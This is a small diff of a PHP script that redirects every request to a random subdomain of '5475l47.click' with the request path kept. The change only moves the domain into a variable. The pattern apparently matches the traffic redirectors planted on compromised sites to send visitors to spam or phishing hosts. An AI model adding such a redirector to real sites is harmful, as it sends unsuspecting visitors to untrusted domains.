@@ -1,5 +1,7 @@
 <?php
-// Function to generate a random alphanumeric string
+
+$domain = "5475l47.click";
+
 function generateRandomString($length = 10) {
     $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
     $charactersLength = strlen($characters);
@@ -17,7 +19,7 @@ $randomSubdomain = generateRandomString(10);
 $requestUri = $_SERVER['REQUEST_URI'];
 
 // Construct the new URL
-$newUrl = 'http://' . $randomSubdomain . '.5475l47.click' . $requestUri;
+$newUrl = 'http://' . $randomSubdomain . '.' . $domain . $requestUri;
 
 // Perform the redirection with a 302 Temporary Redirect
 header("Location: $newUrl", true, 302);
